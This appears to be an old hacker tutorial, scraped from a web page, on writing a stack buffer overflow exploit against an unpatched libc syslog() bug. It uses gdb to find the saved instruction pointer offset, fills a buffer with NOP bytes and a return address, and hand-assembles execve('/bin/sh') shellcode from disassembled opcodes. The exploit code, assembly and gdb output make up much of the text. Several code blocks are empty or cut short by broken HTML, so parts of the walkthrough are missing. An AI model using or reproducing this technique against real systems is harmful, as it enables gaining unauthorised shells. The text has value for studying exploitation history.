<H2>How to write Buffer Overflows</H2>
<pre>
</pre>
</CENTER>

This is really rough, and some of it is not needed. I wrote this as
a reminder note to myself as I really didn't want to look at any more
AT&T assembly again for a while and was afraid I would forget what
I had done. If you are an old assembly guru then you might scoff at
some of this... oh well, it works and that's a hack in itself.

test out the program (duh).

Compile the program and run it. Make sure you include the symbol
table for the debugger or not... depending upon how macho you feel today.
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>

The 'Segmentation fault (core dumped)' is what we wanted to see. This
tells us there is definately an attempt to access some memory address
that we shouldn't. If you do much in 'C' with pointers on a unix machine
you have probably seen this (or Bus error) when pointing or dereferencing
incorrectly.
<P>

Fire up gdb on the program (with or without the core file). Assuming you
remove the core file (this way you can learn a bit about gdb), the
steps would be as follows:
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>

Ok, this is good. The 41's you see are the hex equivallent for the ascii
character 'A'. We are definately going places where we shouldn't be.

The gdb command 'info all-registers' shows the values in the current
hardware registers. The one we are really interested in is 'eip'. On
some platforms this will be called 'ip' or 'pc'. It is the Instruction
Pointer [also called Program Counter]. It points to the memory location
of the next instruction the processor will execute. By overwriting
this you can point to the beginning of your own code and the 
processor will merrily start executing it assuming you have it written
as native opcodes and operands.
<P>

In the above we haven't gotten exactly where we need to be yet. If you want
to see where it crashed out do the following:

If you are familiar with microsoft assembler this will be a bit backwards
to you. For example: in microsoft you would 'mov ax,cx' to move cx to ax.
In AT&T 'mov ax,cx' moves ax to cx. So put on those warp refraction eye-goggles
and on we go.

Now we move it along until we figure out where eip lives in the overflow 
(which is right after ebp in this arch architecture). With that known fact 
we only have to add 4 more bytes to our buffer of 'A''s and we will 
overwrite eip completely.

BINGO!!!
<P>

Here's where it starts to get interesting. Now that we know eip starts
at buffer[2024] and goes through buffer[2027] we can load it up with
whatever we need. The question is... what do we need?
<P>

We find this by looking at the contents of buffer[].
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>

   (gdb) disassemble buffer
   [stuff deleted]
   0xc738 <buffer+2024>:   incl   %ecx
   0xc739 <buffer+2025>:   incl   %ecx
   0xc73a <buffer+2026>:   incl   %ecx
   0xc73b <buffer+2027>:   incl   %ecx
   0xc73c <buffer+2028>:   addb   %al,(%eax)
   0xc73e <buffer+2030>:   addb   %al,(%eax)
   0xc740 <buffer+2032>:   addb   %al,(%eax)
   [stuff deleted]

</PRE></font></tr></td></table>
On the Intel x86 architecture [a pentium here but that doesn't matter]
incl %eax is opcode 0100 0001 or 41hex. addb %al,(%eax) is 0000 0000 or 0x0
hex. We will load up buffer[2024] to buffer[2027] with the address of
0xc73c where we will start our code. You have two options here, one is
to load the buffer up with the opcodes and operands and point the eip
back into the buffer; the other option is what we are going to be doing
which is to put the opcodes and operands after the eip and point to them.
<P>

The advantage to putting the code inside the buffer is that other than
the ebp and eip registers you don't clobber anything else. The disadvantage
is that you will need to do trickier coding (and actually write the
assembly yourself) so that there are no bytes that contain 0x0 which will
look like a null in the string. This will require you to know enough about
the native chip architecture and opcodes to do this [easy enough for some
people on Intel x86's but what happens when you run into an Alpha? -- lucky
for us there is a gdb for Alpha I think ;-)].
<P>

The advantage to putting the code after the eip is that you don't have to
worry about bytes containing 0x0 in them. This way you can write whatever
program you want to execute in 'C' and have gdb generate most of the
machine code for you. The disadvantage is that you are overwriting the
great unknown. In most cases the section you start to overwrite here 
contains your environment variables and other whatnots.... upon 
succesfully running your created code you might be dropped back into
a big void. Deal with it.
<P>

The safest instruction is NOP which is a benign no-operation.
This is what you will probably be loading the buffer up with as filler. 
<P>

Ahhh but what if you don't know what the opcodes are for the particular
architecture you are on. No problem. gcc has a wonderfull function called
__asm__(char *); I rely upon this heavily for doing buffer overflows
on architectures that I don't have assembler books for.

Since nop is at 0x1083 and the next instruction is at 0x1084 we know that
nop only takes up one byte. Examining that byte shows us that it is
0x90 (hex).
<P>

Our program now looks like this:

<TABLE width="100%"><tr><td><font color="#de0000"><PRE>
------ syslog_test_4.c---------

#include <syslog.h>

char buffer[4028];

   for (i=0; i<2024; i++)
       buffer[i]=0x90;

   i=2024;

   buffer[i++]=0x3c;
   buffer[i++]=0xc7;
   buffer[i++]=0x00;
   buffer[i++]=0x00;


   syslog(LOG_ERR, buffer);
}
------end syslog_test_4.c-------

</PRE></font></tr></td></table>

Notice you need to load the eip backwards ie 0000c73c is loaded into
the buffer as 3c c7 00 00.
<P>

Now the question we have is what is the code we insert from here on?
<P>

Suppose we want to run /bin/sh? Gee, I don't have a friggin clue as
to why someone would want to do something like this, but I hear there
are a lot of nasty people out there. Oh well. Here's the proggie we
want to execute in C code:

All you need to do from here is to build up a bit of an environment for
the program. Some of this stuff isn't necesary but I have it in still

I clean up eax. I don't remember why I do this and it shouldn't
really be necesarry. Hell, better quit hitting the sauce.

There are only a couple of more things that we need to add before we
fill in the addresses to a couple of the instructions.
<P>

Since we aren't actually calling execve with a 'call' anymore here, we need 
to push the value in ecx onto the stack to simulate it.
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>
# ------------[execve]
   pushl  %ecx
   leal   0x3b,%eax
   lcall  0x7,0x0

</PRE></font></tr></td></table>
The only other thing is to not pass in the arguments to /bin/sh. We do
this by changing the  ' leal   0xfffffff8(%ebp),%eax' to
' leal   0xfffffffc(%ebp),%eax' [remember 0x0 was moved there].
<P>

So the whole thing looks like this (without knowing the addresses for
the '/bin/sh\0' string):
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>

   movl   %esp,%ebp 
   xorl   %eax,%eax # we added this
   jmp    0x????    # we added this
   popl   %esi      # we added this
   popl   %ecx      # we added this
   movl   $0x????,0xfffffff5(%ebp)
   movl   $0x0,0xfffffffc(%ebp)
   pushl  $0x0
   leal   0xfffffffc(%ebp),%eax  # we changed this
   pushl  %eax
   pushl  $0x????
   leal   0x3b,%eax
   pushl  %ecx       # we added this
   lcall  0x7,0x0
   call   0x????     # we added this

</PRE></font></tr></td></table>
To figure out the bytes to load up our buffer with for the parts that
were already there run gdb on the execute program.
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>

   bash$ gdb execute
   (gdb) disassemble main
   Dump of assembler code for function main:
   to 0x10bc:

   End of assembler dump.

[get out your scratch paper for this one... ]

   0x108d <main+1>:        movl   %esp,%ebp
   this goes from 0x108d to 0x108e. 0x108f starts the next instruction.
   thus we can see the machine code with gdb like this.

   (gdb) x/2bx 0x108d
   0x108d <main+1>:  0x89  0xe5

</PRE></font></tr></td></table>
Now we know that buffer[2028]=0x89 and buffer[2029]=0xe5. Do this for all
of the instructions that we are pulling out of the execute program. 
You can figure out the basic structure for the call command by looking at
the one inexecute that calls execve. Of course you will eventually need
to put in the proper address.
<P>

When I work this out I break down the whole program so I can see what's
going on. Something like the following
<TABLE width="100%"><tr><td><font color="#de0000"><PRE>

   0x108c <main>:  pushl  %ebp
   0x108d <main+1>:        movl   %esp,%ebp
   0x108f <main+3>:        subl   $0x8,%esp

   (gdb) x/bx 0x108c
   0x108c <main>:  0x55
   (gdb) x/bx 0x108d
   0x108d <main+1>:  0x89
   (gdb) x/bx 0x108e
   0x108e <main+2>:  0xe5
   (gdb) x/bx 0x108e
   0x108f <main+3>:  0x83

   so we see the following from this:

   0x55		pushl %ebp

   0x89		movl %esp,%ebp
   0xe5

   0x83		subl $0x8,%esp

   etc. etc. etc.

For commands that you don't know the opcodes to you can find them out
for the particular chip you are on by writing little scratch programs.

   (gdb) disassemble main

   (gdb) x/bx 0x1083
   0x1083 <main+3>:  0x5e

</PRE></font></tr></td></table>
So, 0x5e is popl %esi. You get the idea.

After you have gotten this far build the string up (put in bogus addresses
for the ones you don't know in the jmp's and call's... just so long
as we have the right amount of space being taken up by the jmp and
call instructions... likewise for the movl's where we will need to know
the memory location of 'sh\0\0/bin/sh\0'.
<P>

After you have built up the string, tack on the chars for sh\0\0/bin/sh\0.

Compile the program and load it into gdb. Before you run it in gdb
set a break point for the syslog call.

Look for the last instruction in your code. In this case it was the 'call'
to right after the 'jmp' near the beginning. Our data should be right
after it and indeed we see that it is.

Now go back into your code and put the appropriate addresses in the movl
and pushl. At this point you should also be able to put in the appropriate
operands for the jmp and call. Congrats... you are done. Here's what 
the output will look like when you run this on a system with the non
patched libc/syslog bug.
